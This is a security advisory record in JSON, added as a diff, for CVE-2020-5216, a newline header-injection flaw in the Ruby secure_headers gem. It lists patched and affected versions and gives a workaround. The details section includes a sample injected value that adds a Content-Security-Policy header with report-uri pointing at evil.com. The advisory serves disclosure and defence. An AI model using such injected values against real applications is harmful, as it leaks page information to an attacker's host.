@@ -1,0 +1,216 @@
+{
+  "id": "GHSA-w978-rmpf-qmwg",
+  "summary": "Limited header injection when using dynamic overrides with user input in RubyGems secure_headers",
+  "details": "### Impact\n\nIf user-supplied input was passed into append/override_content_security_policy_directives, a newline could be injected leading to limited header injection.\n\nUpon seeing a newline in the header, rails will silently create a new `Content-Security-Policy` header with the remaining value of the original string. It will continue to create new headers for each newline.\n\ne.g.\n\n```ruby\noverride_content_security_directives(script_src: ['mycdn.com', \"\\ninjected\\n\"])` \n```\n\nwould result in \n\n```\nContent-Security-Policy: ... script-src: mycdn.com\nContent-Security-Policy: injected\nContent-Security-Policy: rest-of-the-header\n```\n\nCSP supports multiple headers and all policies must be satisfied for execution to occur, but a malicious value that reports the current page is fairly trivial:\n\n```ruby\noverride_content_security_directives(script_src: [\"mycdn.com\", \"\\ndefault-src 'none'; report-uri evil.com\"]) \n```\n```\nContent-Security-Policy: ... script-src: mycdn.com\nContent-Security-Policy: default-src 'none'; report-uri evil.com\nContent-Security-Policy: rest-of-the-header\n```\n\n### Patches\n\nThis has been fixed in 6.3.0, 5.2.0, and 3.9.0\n\n### Workarounds\n\n```ruby\noverride_content_security_policy_directives(:frame_src, [user_input.gsub(\"\\n\", \" \")])\n```\n\n### References\n\nhttps://github.com/twitter/secure_headers/security/advisories/GHSA-xq52-rv6w-397c\n[The effect of multiple policies](https://www.w3.org/TR/CSP3/#multiple-policies)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [this repo](https://github.com/twitter/secure_headers/security/advisories/new)\n* DM us at @ndm on twitter",
+  "aliases": [
+    "CVE-2020-5216"
+  ],
+  "modified": "2023-11-08T04:03:51.432736Z",
+  "published": "2020-01-23T02:27:53Z",
+  "related": [
+    "CVE-2020-5216"
+  ],
+  "database_specific": {
+    "nvd_published_at": null,
+    "cwe_ids": [
+      "CWE-113"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2020-01-23T02:27:18Z"
+  },
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/twitter/secure_headers/security/advisories/GHSA-w978-rmpf-qmwg"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-5216"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/twitter/secure_headers/commit/301695706f6a70517c2a90c6ef9b32178440a2d0"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/rubysec/ruby-advisory-db/blob/master/gems/secure_headers/CVE-2020-5216.yml"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/twitter/secure_headers"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "name": "secure_headers",
+        "ecosystem": "RubyGems",
+        "purl": "pkg:gem/secure_headers"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "6.0.0"
+            },
+            {
+              "fixed": "6.3.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "6.0.0",
+        "6.1.0",
+        "6.1.1",
+        "6.1.2",
+        "6.2.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/01/GHSA-w978-rmpf-qmwg/GHSA-w978-rmpf-qmwg.json"
+      }
+    },
+    {
+      "package": {
+        "name": "secure_headers",
+        "ecosystem": "RubyGems",
+        "purl": "pkg:gem/secure_headers"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "5.0.0"
+            },
+            {
+              "fixed": "5.2.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "5.0.1",
+        "5.0.2",
+        "5.0.3",
+        "5.0.4",
+        "5.0.5",
+        "5.1.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/01/GHSA-w978-rmpf-qmwg/GHSA-w978-rmpf-qmwg.json"
+      }
+    },
+    {
+      "package": {
+        "name": "secure_headers",
+        "ecosystem": "RubyGems",
+        "purl": "pkg:gem/secure_headers"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.9.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1.0",
+        "0.1.1",
+        "0.2.0",
+        "0.2.1",
+        "0.3.0",
+        "0.4.0",
+        "0.4.1",
+        "0.4.2",
+        "0.4.3",
+        "0.5.0",
+        "1.0.0",
+        "1.1.0",
+        "1.1.1",
+        "1.2.0",
+        "1.3.0",
+        "1.3.1",
+        "1.3.2",
+        "1.3.3",
+        "1.3.4",
+        "1.4.0",
+        "1.4.1",
+        "2.0.0",
+        "2.0.0.pre",
+        "2.0.0.pre2",
+        "2.0.1",
+        "2.0.2",
+        "2.1.0",
+        "2.2.0",
+        "2.2.1",
+        "2.2.2",
+        "2.2.3",
+        "2.2.4",
+        "2.3.0",
+        "2.4.0",
+        "2.4.1",
+        "2.4.2",
+        "2.4.3",
+        "2.4.4",
+        "2.5.0",
+        "2.5.1",
+        "2.5.2",
+        "2.5.3",
+        "3.0.0",
+        "3.0.0.pre",
+        "3.0.0.pre1",
+        "3.0.0.pre2",
+        "3.0.0.pre3",
+        "3.0.0.rc1",
+        "3.0.1",
+        "3.0.2",
+        "3.0.3",
+        "3.1.0",
+        "3.1.1",
+        "3.1.2",
+        "3.2.0",
+        "3.3.0",
+        "3.3.1",
+        "3.3.2",
+        "3.4.0",
+        "3.4.1",
+        "3.5.0",
+        "3.5.0.pre",
+        "3.5.1",
+        "3.6.0",
+        "3.6.1",
+        "3.6.2",
+        "3.6.3",
+        "3.6.4",
+        "3.6.5",
+        "3.6.6",
+        "3.6.7",
+        "3.7.0",
+        "3.7.1",
+        "3.7.2",
+        "3.7.3",
+        "3.7.4",
+        "3.8.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2020/01/GHSA-w978-rmpf-qmwg/GHSA-w978-rmpf-qmwg.json"
+      }
+    }
+  ],
+  "schema_version": "1.6.0",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N"
+    }
+  ]
+}
